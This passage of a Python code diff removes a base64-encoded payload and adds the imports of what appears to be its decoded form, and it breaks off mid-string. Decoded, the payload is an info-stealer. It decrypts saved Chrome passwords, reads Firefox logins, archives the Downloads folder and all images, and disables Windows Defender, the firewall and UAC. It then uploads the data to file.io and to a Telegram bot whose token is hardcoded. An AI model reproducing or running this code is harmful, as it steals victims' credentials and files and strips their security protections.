@@ -1,9 +1,392 @@
 
-import base64
-import marshal
+import time 
+import threading  
+import shutil 
+import os 
+import sys
+import zipfile
+import sqlite3
+import json
+import platform
+import socket
+import psutil
+import sys
+import requests
+import traceback
+import datetime
+import concurrent.futures
 
-encoded_data = b'CmltcG9ydCB0aW1lIAppbXBvcnQgdGhyZWFkaW5nICAKaW1wb3J0IHNodXRpbCAKaW1wb3J0IG9zIAppbXBvcnQgc3lzCmltcG9ydCB6aXBmaWxlCmltcG9ydCBzcWxpdGUzCmltcG9ydCBqc29uCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc29ja2V0CmltcG9ydCBwc3V0aWwKaW1wb3J0IHN5cwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRyYWNlYmFjawppbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwoKaWYgb3MubmFtZSA9PSAibnQiOgogICAgaW1wb3J0IHdpbjMyY3J5cHQKICAgIGltcG9ydCBzaHV0aWwgCiAgICBmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwogICAgCnN5cy5zdGRlcnIgPSBvcGVuKG9zLmRldm51bGwsICd3JykKCmRlZiBnZXRfcHVibGljX2lwKCk6CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpNjQuaXBpZnkub3JnP2Zvcm1hdD1qc29uIikKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKClbImlwIl0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gZiJM4buXaToge2V9IgoKZGVmIGdldF9wY19pbmZvKCk6CiAgICBpbmZvID0ge30KICAgIGluZm9bIlN5c3RlbSJdID0gcGxhdGZvcm0uc3lzdGVtKCkKICAgIGluZm9bIk5vZGUgTmFtZSJdID0gcGxhdGZvcm0ubm9kZSgpCiAgICBpbmZvWyJSZWxlYXNlIl0gPSBwbGF0Zm9ybS5yZWxlYXNlKCkKICAgIGluZm9bIlZlcnNpb24iXSA9IHBsYXRmb3JtLnZlcnNpb24oKQogICAgaW5mb1siTWFjaGluZSJdID0gcGxhdGZvcm0ubWFjaGluZSgpCiAgICBpbmZvWyJQcm9jZXNzb3IiXSA9IHBsYXRmb3JtLnByb2Nlc3NvcigpCiAgICBpbmZvWyJSQU0iXSA9IHN0cihyb3VuZChwc3V0aWwudmlydHVhbF9tZW1vcnkoKS50b3RhbCAvICgxMDI0ICoqIDMpKSkgKyAiIEdCIiAgCiAgICBpbmZvWyJDUFUgVXNhZ2UiXSA9IHN0cihwc3V0aWwuY3B1X3BlcmNlbnQoKSkgKyAiJSIgIAogICAgaW5mb1siRGlzayBVc2FnZSJdID0gc3RyKHBzdXRpbC5kaXNrX3VzYWdlKCcvJykucGVyY2VudCkgKyAiJSIgIAogICAgaW5mb1siTmV0d29yayBJbmZvIl0gPSBzdHIoZ2V0X3B1YmxpY19pcCgpKQogICAgcmV0dXJuIGluZm8KCmRlZiBnZXRfYW5kcm9pZF9pbmZvKCk6CiAgICBpbmZvID0ge30KICAgIHRyeToKICAgICAgICBpbmZvWyJEZXZpY2UgTmFtZSJdID0gb3MucG9wZW4oImdldHByb3Agcm8ucHJvZHVjdC5tb2RlbCIpLnJlYWQoKS5zdHJpcCgpCiAgICAgICAgaW5mb1siQW5kcm9pZCBWZXJzaW9uIl0gPSBvcy5wb3BlbigiZ2V0cHJvcCByby5idWlsZC52ZXJzaW9uLnJlbGVhc2UiKS5yZWFkKCkuc3RyaXAoKQogICAgICAgIGluZm9bIlJBTSJdID0gb3MucG9wZW4oImZyZWUgLWggfCBncmVwIE1lbSB8IGF3ayAne3ByaW50ICQyfSciKS5yZWFkKCkuc3RyaXAoKSAgCiAgICAgICAgaW5mb1siQ1BVIFVzYWdlIl0gPSBvcy5wb3BlbigidG9wIC1ibjEgfCBncmVwICdDcHUocyknIHwgYXdrICd7cHJpbnQgMTAwIC0gJDh9JyIpLnJlYWQoKS5zdHJpcCgpICsgJyUnCiAgICAgICAgaW5mb1siTmV0d29yayBJbmZvIl0gPSBzdHIoZ2V0X3B1YmxpY19pcCgpKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGluZm9bIkVycm9yIl0gPSAiS2jDtG5nIHRo4buDIHRydXkgY+G6rXAgdGjDtG5nIHRpbiBBbmRyb2lkOiAiICsgc3RyKGUpCiAgICByZXR1cm4gaW5mbwoKZGVmIHNhdmVfaW5mb190b19maWxlKGZpbGVfbmFtZT0ic3lzdGVtLnR4dCIpOgogICAgc3lzdGVtX2luZm8gPSB7fQogICAgY3VycmVudF9wbGF0Zm9ybSA9IHBsYXRmb3JtLnN5c3RlbSgpLmxvd2VyKCkgICAgCiAgICBpZiBjdXJyZW50X3BsYXRmb3JtID09ICJ3aW5kb3dzIjoKICAgICAgICBzeXN0ZW1faW5mb1siUEMgSW5mbyJdID0gZ2V0X3BjX2luZm8oKQogICAgZWxpZiBjdXJyZW50X3BsYXRmb3JtID09ICJsaW51eCI6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIi9kYXRhL2RhdGEvY29tLnRlcm11eCIpOgogICAgICAgICAgICBzeXN0ZW1faW5mb1siQW5kcm9pZCBJbmZvIl0gPSBnZXRfYW5kcm9pZF9pbmZvKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzeXN0ZW1faW5mb1siUEMgSW5mbyJdID0gZ2V0X3BjX2luZm8oKQogICAgZWxzZToKICAgICAgICBzeXN0ZW1faW5mb1siRXJyb3IiXSA9ICJO4buBbiB04bqjbmcga2jDtG5nIGjhu5cgdHLhu6MiICAgIAogICAgd2l0aCBvcGVuKGZpbGVfbmFtZSwgJ3cnKSBhcyBmOgogICAgICAgIGlmICJFcnJvciIgaW4gc3lzdGVtX2luZm86CiAgICAgICAgICAgIGYud3JpdGUoc3lzdGVtX2luZm9bIkVycm9yIl0gKyAiXG4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGZvciBjYXRlZ29yeSwgZGV0YWlscyBpbiBzeXN0ZW1faW5mby5pdGVtcygpOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntjYXRlZ29yeX06XG4iKQogICAgICAgICAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gZGV0YWlscy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiIgIHtrZXl9OiB7dmFsdWV9XG4iKQogICAgICAgICAgICAgICAgZi53cml0ZSgiXG4iKQoKZGVmIGNvbXByZXNzX2Rvd25sb2FkX2ZvbGRlcihvdXRwdXRfZmlsZW5hbWU9IkZpbGUuemlwIik6CiAgICBpZiBvcy5uYW1lID09ICJudCI6ICAKICAgICAgICBkb3dubG9hZF9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJEb3dubG9hZHMiKQogICAgZWxpZiBvcy5uYW1lID09ICJwb3NpeCI6ICAKICAgICAgICBwb3NzaWJsZV9wYXRocyA9IFsKICAgICAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvRG93bmxvYWQiLCAgCiAgICAgICAgICAgICIvc2RjYXJkL0Rvd25sb2FkIiwgICAgICAgICAgICAgCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifi9Eb3dubG9hZHMiKSAgCiAgICAgICAgXQogICAgICAgIGRvd25sb2FkX3BhdGggPSBOb25lCiAgICAgICAgZm9yIHBhdGggaW4gcG9zc2libGVfcGF0aHM6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgZG93bmxvYWRfcGF0aCA9IHBhdGgKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgaWYgbm90IGRvd25sb2FkX3BhdGg6CiAgICAgICAgICAgIHJhaXNlIEZpbGVOb3RGb3VuZEVycm9yKCJLaMO0bmcgdMOsbSB0aOG6pXkgdGjGsCBt4bulYyBEb3dubG9hZHMuIikKICAgIGVsc2U6CiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJVbnN1cHBvcnRlZCBwbGF0Zm9ybS4iKQogICAgb3V0cHV0X3ppcCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgb3V0cHV0X2ZpbGVuYW1lKQogICAgd2l0aCB6aXBmaWxlLlppcEZpbGUob3V0cHV0X3ppcCwgJ3cnLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkgYXMgemlwZjoKICAgICAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhkb3dubG9hZF9wYXRoKToKICAgICAgICAgICAgZm9yIG5hbWUgaW4gZGlyczoKICAgICAgICAgICAgICAgIGZvbGRlcl9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIG5hbWUpCiAgICAgICAgICAgICAgICBmb2xkZXJfemlwX25hbWUgPSBmIntuYW1lfS56aXAiCiAgICAgICAgICAgICAgICBmb2xkZXJfemlwX3BhdGggPSBvcy5wYXRoLmpvaW4oZG93bmxvYWRfcGF0aCwgZm9sZGVyX3ppcF9uYW1lKQogICAgICAgICAgICAgICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoZm9sZGVyX3ppcF9wYXRoLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyBmb2xkZXJfemlwOgogICAgICAgICAgICAgICAgICAgIGZvciBmb2xkZXJfcm9vdCwgXywgZm9sZGVyX2ZpbGVzIGluIG9zLndhbGsoZm9sZGVyX3BhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmb2xkZXJfZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhYnNfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlcl9yb290LCBmaWxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJjbmFtZSA9IG9zLnBhdGgucmVscGF0aChhYnNfZmlsZV9wYXRoLCBmb2xkZXJfcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGRlcl96aXAud3JpdGUoYWJzX2ZpbGVfcGF0aCwgYXJjbmFtZSkKICAgICAgICAgICAgICAgIHppcGYud3JpdGUoZm9sZGVyX3ppcF9wYXRoLCBvcy5wYXRoLnJlbHBhdGgoZm9sZGVyX3ppcF9wYXRoLCBkb3dubG9hZF9wYXRoKSkKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShmb2xkZXJfemlwX3BhdGgpICAKICAgICAgICAgICAgZm9yIG5hbWUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSkKICAgICAgICAgICAgICAgIGlmIG5hbWUgPT0gb3V0cHV0X2ZpbGVuYW1lOiAgCiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIHppcGYud3JpdGUoZmlsZV9wYXRoLCBvcy5wYXRoLnJlbHBhdGgoZmlsZV9wYXRoLCBkb3dubG9hZF9wYXRoKSkKCmRlZiBjb21wcmVzc19hbGxfaW1hZ2VzKG91dHB1dF96aXA9IkltYWdlcy56aXAiKToKICAgIGlmIG9zLm5hbWUgPT0gIm50IjogIAogICAgICAgIHJvb3RfZGlycyA9IFtvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdXSAgCiAgICBlbGlmIG9zLm5hbWUgPT0gInBvc2l4IjogIAogICAgICAgIHJvb3RfZGlycyA9IFsKICAgICAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAiLCAgCiAgICAgICAgICAgICIvc2RjYXJkIiwgICAgICAgICAgICAgIAogICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSAgCiAgICAgICAgXQogICAgZWxzZToKICAgICAgICByYWlzZSBFeGNlcHRpb24oIlVuc3VwcG9ydGVkIHBsYXRmb3JtLiIpCiAgICBpbWFnZV9leHRlbnNpb25zID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLmdpZiIsICIuYm1wIiwgIi50aWZmIiwgIi53ZWJwIikKICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKG91dHB1dF96aXAsICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpIGFzIHppcGY6CiAgICAgICAgZm9yIHJvb3RfZGlyIGluIHJvb3RfZGlyczoKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHJvb3RfZGlyKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHJvb3RfZGlyKToKICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aChpbWFnZV9leHRlbnNpb25zKToKICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGFyY25hbWUgPSBvcy5wYXRoLnJlbHBhdGgoZnVsbF9wYXRoLCByb290X2RpcikgIAogICAgICAgICAgICAgICAgICAgICAgICB6aXBmLndyaXRlKGZ1bGxfcGF0aCwgYXJjbmFtZSkKCmRlZiBkZWNyeXB0X3Bhc3N3b3JkKGVuY3J5cHRlZF9wYXNzd29yZCwga2V5KToKICAgIHRyeToKICAgICAgICBpdiA9IGVuY3J5cHRlZF9wYXNzd29yZFszOjE1XQogICAgICAgIGVuY3J5cHRlZF9wYXNzd29yZCA9IGVuY3J5cHRlZF9wYXNzd29yZFsxNTpdCiAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhrZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KGVuY3J5cHRlZF9wYXNzd29yZClbOi0xNl0uZGVjb2RlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGdldF9jaHJvbWVfZW5jcnlwdGlvbl9rZXkoKToKICAgIGxvY2FsX3N0YXRlX3BhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgb3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgciJBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRlIgogICAgKQogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbihsb2NhbF9zdGF0ZV9wYXRoLCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGZpbGU6CiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhmaWxlLnJlYWQoKSkKICAgICAgICBlbmNyeXB0ZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKVs1Ol0KICAgICAgICByZXR1cm4gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGdldF9jaHJvbWVfcGFzc3dvcmRzKCk6CiAgICBrZXkgPSBnZXRfY2hyb21lX2VuY3J5cHRpb25fa2V5KCkKICAgIGlmIG5vdCBrZXk6CiAgICAgICAgcmV0dXJuICJLaMO0bmcgdGjhu4MgbOG6pXkga2V5IG3DoyBow7NhIHThu6sgQ2hyb21lLiIgICAgCiAgICBkYl9wYXRoID0gb3MucGF0aC5qb2luKAogICAgICAgIG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sIHIiQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiCiAgICApCiAgICB0ZW1wX2RiX3BhdGggPSBkYl9wYXRoICsgIl90ZW1wIgogICAgc2h1dGlsLmNvcHlmaWxlKGRiX3BhdGgsIHRlbXBfZGJfcGF0aCkgICAgCiAgICB0cnk6CiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCh0ZW1wX2RiX3BhdGgpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKICAgICAgICBkYXRhID0gW10KICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICB1cmwgPSByb3dbMF0KICAgICAgICAgICAgdXNlcm5hbWUgPSByb3dbMV0KICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gcm93WzJdCiAgICAgICAgICAgIHBhc3N3b3JkID0gZGVjcnlwdF9wYXNzd29yZChlbmNyeXB0ZWRfcGFzc3dvcmQsIGtleSkKICAgICAgICAgICAgaWYgcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICBkYXRhLmFwcGVuZChmInt1cmx9IHwge3VzZXJuYW1lfSB8IHtwYXNzd29yZH0iKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKHRlbXBfZGJfcGF0aCkKICAgICAgICByZXR1cm4gZGF0YQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIG9zLnJlbW92ZSh0ZW1wX2RiX3BhdGgpCiAgICAgICAgcmV0dXJuIFtdCgpkZWYgZ2V0X2ZpcmVmb3hfcGFzc3dvcmRzKCk6CiAgICB0cnk6CiAgICAgICAgZmlyZWZveF9wcm9maWxlID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICBvcy5lbnZpcm9uWydBUFBEQVRBJ10sIHIiTW96aWxsYVxGaXJlZm94XFByb2ZpbGVzIgogICAgICAgICkKICAgICAgICBwcm9maWxlcyA9IG9zLmxpc3RkaXIoZmlyZWZveF9wcm9maWxlKQogICAgICAgIGZvciBwcm9maWxlIGluIHByb2ZpbGVzOgogICAgICAgICAgICBsb2dpbl9kYiA9IG9zLnBhdGguam9pbihmaXJlZm94X3Byb2ZpbGUsIHByb2ZpbGUsICJsb2dpbnMuanNvbiIpCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGxvZ2luX2RiKToKICAgICAgICAgICAgICAgIHdpdGggb3Blbihsb2dpbl9kYiwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgIGxvZ2lucyA9IGpzb24ubG9hZChmaWxlKQogICAgICAgICAgICAgICAgZGF0YSA9IFtdCiAgICAgICAgICAgICAgICBmb3IgbG9naW4gaW4gbG9naW5zWydsb2dpbnMnXToKICAgICAgICAgICAgICAgICAgICBkYXRhLmFwcGVuZChmIntsb2dpblsnaG9zdG5hbWUnXX0gfCB7bG9naW5bJ2VuY3J5cHRlZFVzZXJuYW1lJ119IHwge2xvZ2luWydlbmNyeXB0ZWRQYXNzd29yZCddfSIpCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQogICAgICAgIHJldHVybiAiS2jDtG5nIHTDrG0gdGjhuqV5IHRow7RuZyB0aW4gdOG7qyBGaXJlZm94LiIKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gIktow7RuZyB0aOG7gyBs4bqleSBk4buvIGxp4buHdSB04burIEZpcmVmb3guIiAgICAKCmRlZiBjb21wcmVzc19maWxlc19kYXRhX3RvX3ppcChvdXRwdXRfemlwPSJCcm93c2VyLnppcCIpOgogICAgb3BlbigiY2hyb21lLnR4dCIsICd3Jykud3JpdGUoZ2V0X2Nocm9tZV9wYXNzd29yZHMoKSkKICAgIG9wZW4oImZpcmVmb3gudHh0IiwgJ3cnKS53cml0ZShnZXRfZmlyZWZveF9wYXNzd29yZHMoKSkKICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKG91dHB1dF96aXAsICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpIGFzIHppcGY6CiAgICAgICAgZm9yIGZpbGUgaW4gWyJjaHJvbWUudHh0IiwgImZpcmVmb3gudHh0Il06CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGZpbGUpOgogICAgICAgICAgICAgICAgemlwZi53cml0ZShmaWxlLCBvcy5wYXRoLmJhc2VuYW1lKGZpbGUpKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGUpCiAgICAKZGVmIHNlbmRfZmlsZV90b19ib3QoZmlsZV9wYXRoLCBsaW5rKToKICAgIHRyeToKICAgICAgICB0b2tlbiA9ICI3Njk3NTY0NjM5OkFBR2Y3Rng4cThGWktDdVVUNEdqc0lYVXdPUUVTT083TTlnIgogICAgICAgIGNoYXRfaWQgPSAiNjE4NjYyMTgxNSIKICAgICAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmREb2N1bWVudCIKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncmInKSBhcyBmaWxlOgogICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgJ2NoYXRfaWQnOiBjaGF0X2lkLCAgCiAgICAgICAgICAgICAgICAnY2FwdGlvbic6IGYnJydBcGRoeSBCT1RORVQgCj4+PiBEYXRlIFRpbWU6IHtkYXRldGltZS5kYXRldGltZS5ub3coKS5zdHJmdGltZSgnJVktJW0tJWQgJUg6JU06JVMnKX0gPDw8Cj4+PiBMaW5rOiB7bGlua30gPDw8Cj4+PiBUaMO0bmcgdGluIG3DoXkgxJHDoyBoYWNrISA8PDwKPj4+IEFQREhZIEJPVE5FVCA8PDwKPj4+IFNZUyBMb2FkaW5nIEYyIDw8PCcnJywKICAgICAgICAgICAgfQogICAgICAgICAgICBmaWxlcyA9IHsKICAgICAgICAgICAgICAgICdkb2N1bWVudCc6IGZpbGUKICAgICAgICAgICAgfQogICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhLCBmaWxlcz1maWxlcykKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkzhu5dpOiB7ZX0iKQoKZGVmIHVwbG9hZF9maWxlKGZpbGVfcGF0aCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZmlsZToKICAgICAgICAgICAgZmlsZXMgPSB7J2ZpbGUnOiAoZmlsZV9wYXRoLCBmaWxlKX0KICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2ZpbGUuaW8vJywgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICAgICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmdldCgnbGluaycsICdMaW5rIG5vdCBmb3VuZCBpbiByZXNwb25zZScpCiAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHJldHVybiBmIkVycm9yIGR1cmluZyByZXF1ZXN0OiB7ZX0iCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcmV0dXJuICJGaWxlIG5vdCBmb3VuZCEiCgpsaXN0X2ZpbGVfc2VuZF90ZWxlID0gW10KCmRlZiBzdGVhbGVyKCk6CiAgICB0cnk6CiAgICAgICAgc2F2ZV9pbmZvX3RvX2ZpbGUoInN5c3RlbS50eHQiKSAgICAgICAgCiAgICAgICAgY29tcHJlc3NfZG93bmxvYWRfZm9sZGVyKCJGaWxlLnppcCIpCiAgICAgICAgbGlzdF9maWxlX3NlbmRfdGVsZS5hcHBlbmQoIkZpbGUuemlwIikKICAgICAgICBjb21wcmVzc19hbGxfaW1hZ2VzKCJJbWFnZXMuemlwIikKICAgICAgICBsaXN0X2ZpbGVfc2VuZF90ZWxlLmFwcGVuZCgiSW1hZ2VzLnppcCIpCiAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOiAgICAgICAgICAgIAogICAgICAgICAgICBvcy5zeXN0ZW0oJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxQb2xpY2llc1xcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdhcmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YnKQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxQb2xpY2llc1xcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlUm91dGluZWx5VGFraW5nQWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9mJykKICAgICAgICAgICAgb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcUG9saWNpZXNcXE1pY3Jvc29mdFxcV2luZG93cyBEZWZlbmRlciIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZicpCiAgICAgICAgICAgIG9zLnN5c3RlbSgnbmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZicpCiAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUG9saWNpZXNcXFN5c3RlbSIgL3YgRW5hYmxlTFVBIC90IFJFR19EV09SRCAvZCAwIC9mJykKICAgICAgICAgICAgb3Muc3lzdGVtKCdzYyBjb25maWcgV2luRGVmZW5kIHN0YXJ0PSBkaXNhYmxlZCAmJiBzYyBzdG9wIFdpbkRlZmVuZCcpCiAgICAgICAgICAgIG9zLnN5c3RlbSgnc2MgY29uZmlnIHdzY3N2YyBzdGFydD0gZGlzYWJsZWQgJiYgc2Mgc3RvcCB3c2NzdmMnKQogICAgICAgICAgICBjb21wcmVzc19maWxlc19kYXRhX3RvX3ppcCgiQnJvd3Nlci56aXAiKQogICAgICAgICAgICBsaXN0X2ZpbGVfc2VuZF90ZWxlLmFwcGVuZCgiQnJvd3Nlci56aXAiKQogICAgICAgIG91dF96aXAgPSBmIntnZXRfcHVibGljX2lwKCl9LnppcCIKICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShvdXRfemlwLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyB6aXBmOgogICAgICAgICAgICBmb3IgZmlsZSBpbiBsaXN0X2ZpbGVfc2VuZF90ZWxlOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgemlwZi53cml0ZShmaWxlLCBvcy5wYXRoLmJhc2VuYW1lKGZpbGUpKSAgCiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGUpICAgICAgICAKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygic3lzdGVtLnR4dCIpOgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvdXRfemlwKToKICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgb3V0X3ppcCkKICAgICAgICAgICAgICAgIGxpbmsgPSB1cGxvYWRfZmlsZShmaWxlX3BhdGgpCiAgICAgICAgICAgIHNlbmRfZmlsZV90b19ib3QoInN5c3RlbS50eHQiLCBsaW5rKQogICAgICAgICAgICBvcy5yZW1vdmUoInN5c3RlbS50eHQiKQogICAgICAgICAgICBvcy5yZW1vdmUob3V0X3ppcCkgICAgICAgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJM4buXaToge2V9IikKCndpdGggY29uY3VycmVudC5mdXR1cmVzLlRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0xKSBhcyBleGVjdXRvcjoKICAgIGZ1dHVyZXMgPSBbXQogICAgZnV0dXJlcy5hcHBlbmQoZXhlY3V0b3Iuc3VibWl0KHN0ZWFsZXIpKQogICAgY29uY3VycmVudC5mdXR1cmVzLndhaXQoZnV0dXJlcykKICAgIGZvciBmdXR1cmUgaW4gZnV0dXJlczoKICAgICAgICBmdXR1cmUucmVzdWx0KCkgIAoKIyBUaMO0bmcgdGluIFRlbGVncmFtIEJvdApUT0tFTiA9ICI3Njk3NTY0NjM5OkFBR2Y3Rng4cThGWktDdVVUNEdqc0lYVXdPUUVTT083TTlnIgpDSEFUX0lEID0gIjYxODY2MjE4MTUiClRFTEVHUkFNX1VSTCA9IGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT0tFTn0vc2VuZERvY3VtZW50IgoKIyBGYWtlIGxvYW